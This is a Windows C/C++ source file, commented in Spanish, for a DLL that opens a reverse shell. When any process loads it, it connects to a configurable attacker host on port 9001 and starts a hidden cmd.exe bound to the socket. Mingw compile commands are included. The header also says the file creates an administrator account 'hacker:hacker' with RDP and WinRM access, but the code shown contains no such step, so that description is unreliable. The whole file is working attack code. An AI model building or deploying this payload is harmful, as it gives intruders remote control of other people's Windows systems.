/*
DESCRIPTION
Simple reverse shell for windows
  Crea usuario hacker:hacker y lo añade a administradores y 
  le da acceso RDP y WinRM

  Para compilar
  x86_64-w64-mingw32-gcc -static simpleRevShellWinDll.cpp --shared -o rev.dll -lws2_32 -DLHOST='"10.10.10.1"'
  i686-w64-mingw32-gcc -static simpleRevShellWinDll.cpp --shared -o rev32.dll -lws2_32 -DLHOST='"10.10.10.1"'
*/

#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>
#include <io.h>
#include <stdio.h>
#include <string.h>


#ifndef LHOST
#define LHOST "127.0.0.1"  //Default IP
#endif

#ifndef LPORT
#define LPORT 9001  //Default port
#endif


void rev()
{
  WSADATA wsaData;
  WSAStartup(MAKEWORD(2 ,2), &wsaData);

  struct sockaddr_in sa;
  SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  sa.sin_family = AF_INET;
  sa.sin_port = htons(LPORT);
  sa.sin_addr.s_addr = inet_addr(LHOST);

  if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
    return;
  }

  STARTUPINFO sinfo;
  memset(&sinfo, 0, sizeof(sinfo));
  sinfo.cb = sizeof(sinfo);
  sinfo.dwFlags = (STARTF_USESTDHANDLES);
  sinfo.hStdInput = (HANDLE)sockt;
  sinfo.hStdOutput = (HANDLE)sockt;
  sinfo.hStdError = (HANDLE)sockt;
  PROCESS_INFORMATION pinfo;
  CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
}



BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.char *
            rev();
            break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
            break;
        case DLL_THREAD_DETACH: // A thread exits normally.
            break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
    }
    return TRUE;
}





